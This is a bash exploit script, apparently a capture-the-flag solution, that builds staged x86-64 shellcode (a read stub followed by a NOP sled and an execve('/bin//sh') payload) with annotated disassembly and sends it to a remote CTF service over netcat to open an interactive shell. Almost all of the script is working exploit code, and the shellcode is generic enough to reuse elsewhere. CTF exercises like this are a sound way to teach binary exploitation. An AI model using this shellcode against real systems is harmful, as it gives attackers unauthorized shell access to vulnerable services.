#!/bin/bash

if [[ -e payload_6_1 ]]; then
    rm payload_6_1
fi
if [[ -e payload_6_2 ]]; then
    rm payload_6_2
fi

host="ctf.adl.tw"
port="10003"


# 20 bytes a frame
frame="\x0c\x87\x63"$(printf "\x01%.0s" $(seq 1 17))


shellcode_sys_read="\x0c\x87\x63\xd0\x48\x31\xc0\x48\x89\xc7\x48\x8d\x74\x24\x08\x0f\x05"
: << Instruction
0c 87                   or     al, 0x87
63 d0                   movsxd edx, eax  # assign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
48 31 c0                xor    rax, rax
48 89 c7                mov    rdi, rax
48 8d 74 24 08          lea    rsi, [rsp+0x8]
0f 05                   syscall
Instruction

echo -ne $shellcode_sys_read"\x01\x01\x01"$(printf "$frame%.0s" $(seq 1 9)) > payload_6_1

shellcode_sys_exeve="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
: << Instruction
48 31 f6                xor    rsi, rsi
56                      push   rsi
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
57                      push   rdi
54                      push   rsp
5f                      pop    rdi
6a 3b                   push   0x3b
58                      pop    rax
99                      cdq
0f 05                   syscall
Instruction

echo -ne $(printf "\x90%.0s" $(seq 1 17))$shellcode_sys_exeve > payload_6_2

(cat payload_6_1;cat payload_6_2; cat - ) | nc $host $port
